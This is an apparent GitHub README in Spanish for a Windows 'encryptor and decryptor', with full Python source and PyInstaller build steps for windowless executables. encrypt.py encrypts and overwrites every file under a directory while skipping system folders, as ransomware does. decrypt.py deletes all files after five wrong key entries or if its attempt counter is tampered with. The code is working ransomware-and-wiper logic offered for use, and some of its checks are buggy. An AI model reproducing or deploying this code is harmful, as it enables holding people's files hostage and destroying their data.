# 🔐 Encriptador y Desencriptador de Archivos

Este proyecto contiene scripts de Python y ejecutables (.exe) que permiten encriptar y desencriptar archivos en un sistema Windows. Los archivos encriptados se sobrescriben en su ubicación original para mayor seguridad.

## 🚀 Comenzando

Sigue estos pasos para usar los ejecutables y scripts de Python en tu equipo.

### 📝 Prerrequisitos

- Sistema operativo Windows
- Acceso a GitHub para clonar el repositorio o descargar los archivos
- Python 3.7+ instalado (si deseas modificar los scripts de Python)
- PyInstaller (si deseas convertir los scripts de Python a ejecutables .exe)

### 📥 Instalación

1. **Clonar el repositorio** o **descargar los archivos**:
    ```sh
    git clone https://github.com/tuusuario/tu-repositorio.git
    cd tu-repositorio
    ```

2. **Ubicar los ejecutables**:
    - Encontrarás los archivos `encrypt.exe` y `decrypt.exe` en la carpeta del proyecto.

### 🔒 Encriptar Archivos

Para encriptar los archivos, simplemente ejecuta el archivo `encrypt.exe`:

1. **Doble clic** en `encrypt.exe` o ejecuta en la terminal:
    ```sh
    .\encrypt.exe
    ```

2. El programa encriptará y sobrescribirá los archivos en el directorio `C:\\enum`.

### 🔓 Desencriptar Archivos

Para desencriptar los archivos, ejecuta el archivo `decrypt.exe`:

1. **Doble clic** en `decrypt.exe` o ejecuta en la terminal:
    ```sh
    .\decrypt.exe
    ```

2. Se te pedirá que ingreses la clave de encriptación.
3. Tienes hasta 5 intentos para ingresar la clave correcta. Si fallas los 5 intentos, los archivos serán eliminados.

### 🔧 Modificar los Scripts de Python

Si deseas modificar los scripts de Python, sigue estos pasos:

1. **Abrir los archivos .py**:
    - `encrypt.py`
    - `decrypt.py`

2. **Editar los scripts** según tus necesidades. Puedes usar cualquier editor de texto o un entorno de desarrollo integrado (IDE) como Visual Studio Code, PyCharm, etc.

3. **Instalar Python y PyInstaller** si no los tienes ya instalados:
    ```sh
    # Instalar Python (si no está instalado)
    https://www.python.org/downloads/

    # Instalar PyInstaller
    pip install pyinstaller
    ```

4. **Convertir los scripts a ejecutables .exe**:
    - Abre una terminal y navega a la carpeta donde se encuentran los archivos .py.
    - Ejecuta los siguientes comandos:
    ```sh
    pyinstaller --onefile --noconsole encrypt.py
    pyinstaller --onefile --noconsole decrypt.py
    ```

5. **Encontrar los archivos .exe** generados en la carpeta `dist`.

### 📄 Código Fuente

Aquí está el código fuente de los scripts de Python utilizados en este proyecto.

#### encrypt.py

```python
import os
from cryptography.fernet import Fernet
from tqdm import tqdm

# Ruta para guardar la clave de encriptación
key_path = 'C:\\enum2\\key.key'
if not os.path.exists(key_path):
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
else:
    with open(key_path, 'rb') as key_file:
        key = key_file.read()

cipher = Fernet(key)

# Lista de exclusiones
exclusions = [
    'C:\\Windows',
    'C:\\Program Files',
    'C:\\Program Files (x86)',
    'C:\\Users\\Default',
    'C:\\Users\\Public',
    'C:\\Users\\<Username>\\AppData',
    'C:\\Users\\<Username>\\NTUSER.DAT',
    'C:\\Users\\<Username>\\ntuser.dat.LOG1',
    'C:\\Users\\<Username>\\ntuser.dat.LOG2',
    'C:\\Users\\<Username>\\Local Settings',
    'C:\\Users\\<Username>\\LocalService',
    'C:\\Users\\<Username>\\NetworkService'
]

def should_exclude(path):
    for exclusion in exclusions:
        if path.startswith(exclusion):
            return True
    return False

def encrypt_and_overwrite_file(filepath):
    try:
        with open(filepath, 'rb') as file:
            data = file.read()
        
        encrypted_data = cipher.encrypt(data)
        
        with open(filepath, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
    except Exception as e:
        print(f"Error encriptando el archivo {filepath}: {e}")

def encrypt_directory(root_dir):
    for dirpath, dirnames, filenames in os.walk(root_dir):
        if should_exclude(dirpath):
            continue
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            encrypt_and_overwrite_file(filepath)

# Ejecutar el encriptado del directorio raíz
encrypt_directory('C:\\enum')

print("Archivos encriptados y sobrescritos en su ubicación original.")
```

#### decrypt.py
```
import os
import tkinter as tk
from tkinter import simpledialog, messagebox
from cryptography.fernet import Fernet, InvalidToken
from tqdm import tqdm

# Directorio raíz del sistema
root_dir = 'C:\\enum'

# Ruta del archivo de clave
key_path = 'C:\\enum2\\key.key'

# Archivo de intentos fallidos
attempts_path = 'C:\\enum2\\.decrypt_attempts'

# Archivo de registro para `tqdm`
log_file_path = 'C:\\enum2\\decrypt_log.txt'

# Generar una clave interna para cifrar el contador de intentos
internal_key = Fernet.generate_key()
internal_cipher = Fernet(internal_key)

# Leer el número de intentos fallidos
attempts = 0
if os.path.exists(attempts_path):
    with open(attempts_path, 'rb') as attempts_file:
        encrypted_attempts = attempts_file.read()
    try:
        decrypted_attempts = internal_cipher.decrypt(encrypted_attempts)
        attempts = int(decrypted_attempts.decode())
    except InvalidToken:
        print("Error: Archivo de intentos comprometido. Eliminando archivos.")
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for filename in filenames:
                os.remove(os.path.join(dirpath, filename))
        exit()

# Lista de exclusiones
exclusions = [
    'C:\\Windows',
    'C:\\Program Files',
    'C:\\Program Files (x86)',
    'C:\\Users\\Default',
    'C:\\Users\\Public',
    'C:\\Users\\<Username>\\AppData',
    'C:\\Users\\<Username>\\NTUSER.DAT',
    'C:\\Users\\<Username>\\ntuser.dat.LOG1',
    'C:\\Users\\<Username>\\ntuser.dat.LOG2',
    'C:\\Users\\<Username>\\Local Settings',
    'C:\\Users\\<Username>\\LocalService',
    'C:\\Users\\<Username>\\NetworkService'
]

def should_exclude(path):
    for exclusion in exclusions:
        if path.startswith(exclusion):
            return True
    return False

# Solicita la clave de encriptación al usuario y verifica si es correcta
def get_encryption_key():
    root = tk.Tk()
    root.withdraw()
    return simpledialog.askstring("Clave de encriptación", "Introduce la clave de encriptación:", show='*')

key = None
cipher = None
is_valid_key = False

while not is_valid_key and attempts < 5:
    key = get_encryption_key()
    if key is None:
        print("Operación cancelada por el usuario.")
        exit()
    key = key.encode()
    try:
        cipher = Fernet(key)
        # Probar desencriptar algo para verificar la clave
        test_file = False
        for dirpath, dirnames, filenames in os.walk(root_dir):
            if should_exclude(dirpath):
                continue
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                try:
                    with open(filepath, 'rb') as file:
                        encrypted_data = file.read()
                    cipher.decrypt(encrypted_data)
                    test_file = True
                    break
                except InvalidToken:
                    continue
            if test_file:
                break
        is_valid_key = True
    except InvalidToken:
        attempts += 1
        encrypted_attempts = internal_cipher.encrypt(str(attempts).encode())
        with open(attempts_path, 'wb') as attempts_file:
            attempts_file.write(encrypted_attempts)
        if attempts < 5:
            messagebox.showerror("Clave incorrecta", f"Clave de encriptación incorrecta. Te quedan {5 - attempts} intentos.")
        else:
            messagebox.showerror("Máximo de intentos alcanzado", "Número máximo de intentos fallidos alcanzado. Eliminando archivos.")
            for dirpath, dirnames, filenames in os.walk(root_dir):
                if should_exclude(dirpath):
                    continue
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    os.remove(filepath)
            exit()

if is_valid_key:
    # Restablecer el contador de intentos si la clave es correcta
    if os.path.exists(attempts_path):
        os.remove(attempts_path)

    def decrypt_and_restore_file(filepath):
        try:
            with open(filepath, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = cipher.decrypt(encrypted_data)
            
            with open(filepath, 'wb') as decrypt_file:
                decrypt_file.write(decrypted_data)
        except Exception as e:
            print(f"Error desencriptando el archivo {filepath}: {e}")

    # Desencriptar archivos con una barra de progreso
    with tqdm(total=sum([len(files) for r, d, files in os.walk(root_dir)]), desc="Desencriptando archivos", ncols=100) as pbar:
        for dirpath, dirnames, filenames in os.walk(root_dir):
            if should_exclude(dirpath):
                continue
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                decrypt_and_restore_file(filepath)
                pbar.update(1)
print("Archivos desencriptados y restaurados con sus nombres y rutas originales.")
```

### 📝 Licencia

Este proyecto está bajo la Licencia MIT. Para más detalles, consulta el archivo LICENSE.
